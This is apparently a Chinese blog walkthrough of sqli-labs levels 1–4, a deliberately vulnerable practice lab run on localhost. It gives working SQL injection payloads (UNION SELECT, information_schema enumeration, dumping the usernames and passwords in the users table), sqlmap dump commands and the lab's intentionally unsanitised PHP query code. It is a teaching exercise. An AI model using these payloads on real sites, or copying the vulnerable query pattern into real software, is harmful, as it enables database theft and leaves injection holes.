---
 title: Sqlilabs通关笔记(1-4)
 date: 2020-01-02 15:28:58
 tags: SQL注入
 categories:
---


## 环境搭建

## 用于SQL注入学习环境

1. [关卡源码下载地址](https://github.com/Audi-1/sqli-labs)，[美化页面下载地址](https://github.com/himadriganguly/sqlilabs)，
2. 用phpstudy或者web环境直接搭建运行


## 第一关 基于错误的GET单引号字符型注入
![2020-1-2-17-52-39](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-52-39)

<!--more-->
### 存在注入点判断

1. 加上单引号报错
```
http://localhost/sqlilabs/practice/example1.php?id=1'
```

2. 加上注释符页面正常
```
http://localhost/sqlilabs/practice/example1.php?id=1' %23
```
    * 注释方式
        - \# 号注释
        - %23 注释 
        - --+ 注释
3. 判断字段数(使用order by)

```
http://localhost/sqlilabs/practice/example1.php?id=1'  order by 3%23 # 正常
http://localhost/sqlilabs/practice/example1.php?id=1'  order by 4%23 # 页面显示错误

说明字段数为3
```

4. 执行注入Payload
```
# 判断显示的信息点，通过id=-1来执行联合查询
http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,2,3%23
```

![2020-1-2-17-53-4](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-53-4)

* **常用查询信息**
    - database() # 在用的数据库名
    - user()    # 用户信息
    - version() # 数据库版本信息
    - @@basedir # 数据库安装路径
    - @@version_compile_os # 操作系统版本


![2020-1-2-17-43-36](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-43-36)


5. 查看数据库数据

* 查看表名称

    **group_concat函数:将查询到的多行结果连接成字符串**
    ```
    http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
    ```

* 查看列名

    ```
    http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema ='sqlilabs' AND table_name='users' --+
    ```
* 查看字段

    ```
    http://localhost/sqlilabs/practice/example1.php?id=-1' UNION SELECT 1,group_concat(username SEPARATOR '-'),group_concat(password SEPARATOR '-') FROM users --+
    ```

    将整个表内容显示出来了

    ![2020-1-3-12-29-35](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-29-35)

    ### sqlmap 注入常用命令
    ```
    sqlmap -u “注入地址” -v 1 –-dbs # 列举数据库
    sqlmap -u “注入地址” -v 1 –-current-db # 当前数据库
    sqlmap -u “注入地址” -v 1 –-users # 列数据库用户
    sqlmap -u “注入地址” -v 1 -D “数据库” –-tables # 列举数据库的表名
    sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns # 获取表的列名
    sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump # 获取表中的数据
    ```
    * **注意的点**
        1. **-–batch** 默认运行
        2. **--dbs** 爆破数据库
        3. **-–technique** 指定sqlmap使用的检测技术
            - B:Boolean-based-blind （布尔型型注入）
            - U:Union query-based （联合注入）
            - E:Error-based （报错型注入
            - S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）
            - T:Time-based blind （基于时间延迟注入）

            > sqlmap -u "http://localhost/Less-1/?id=1" --dbs --batch --technique B
    
## 第二关 基于错误的GET整型注入
![2020-1-3-12-46-33](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-46-33)

### 存在注入点判断

1. 加上单引号报错
```
http://localhost/sqlilabs2/Less-2/index.php?id=1'--+
```
2. 加上and 1=1 页面正常
```
http://localhost/sqlilabs2/Less-2/index.php?id=1 and 1=1--+
```
3. 加上and 12=2 页面不正常
```
http://localhost/sqlilabs2/Less-2/index.php?id=1 and 12=2--+
```
**说明执行了传入的payload，存在注入**

4. 判断字段数
```
http://localhost/sqlilabs2/Less-2/index.php?id=1 order by 3--+ # 正常
http://localhost/sqlilabs2/Less-2/index.php?id=1 order by 4--+ # 页面显示错误

说明字段数为3
```

5. 查询表名

```
http://localhost/sqlilabs2/Less-2/index.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+
```

6. 查询字段名

```
http://localhost/sqlilabs2/Less-2/index.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' --+
```

![2020-1-3-12-57-11](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-57-11)

7. 直接查询数据库数据

```
http://localhost/sqlilabs2/Less-2/index.php?id=-1 union select 1,group_concat(username),group_concat(password) from users --+
```

![2020-1-3-12-59-54](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-12-59-54)

## 第三关 基于错误的GET单引号变形注入
![2020-1-3-13-7-22-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-7-22-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))

### 存在注入点判断

**加上单引号报错,发现存在)**

![2020-1-3-13-24-54-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-24-54-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))

    
    ```
    http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=2 --+ # 报错
    http://localhost/sqlilabs2/Less-3/index.php?id=1') and 1=1 --+ # 正常
    ```
**直接上payload,将数据库脱出**
```
    http://localhost/sqlilabs2/Less-3/index.php?id=-1') union select 1,group_concat(username),group_concat(password) from users --+
```

## 第四关 基于错误的GET双引号字符型注入

### 存在注入点判断
**加上双引号报错,发现存在"**

![2020-1-3-13-46-16-Sqlilabs通关笔记(1-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-13-46-16-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-10))
    ```
    http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=2 --+ # 报错
    http://localhost/sqlilabs2/Less-4/index.php?id=1") and 1=1 --+ # 正常
    ```
**直接上payload,将数据库脱出**
```
 http://localhost/sqlilabs2/Less-4/index.php?id=-1") union select 1,group_concat(username),group_concat(password) from users--+
```

### SQLMAP注入
**直接上payload  1-4关皆可以用该命令**

```
sqlmap -u "http://localhost/sqlilabs2/Less-2/index.php?id=1" --batch -D security -T users --columns --dump
```

## 源代码分析
1. 直接贴源码
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-1.jpg" /></center>
</body>
</html>
```

2. 由源码看出对GET传入的参数未做任何过滤，并打印出错误信息，直接在数据库中查询，导致可以将payload传入拼接执行
    - 第一题SQL语句 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    - 第二题SQL语句 $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
    - 第三题SQL语句 $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
    - 第四题SQL语句 $sql="SELECT * FROM users WHERE id=("$id") LIMIT 0,1";

3. 通过源代码可以更加清晰的理解payload的构造思路





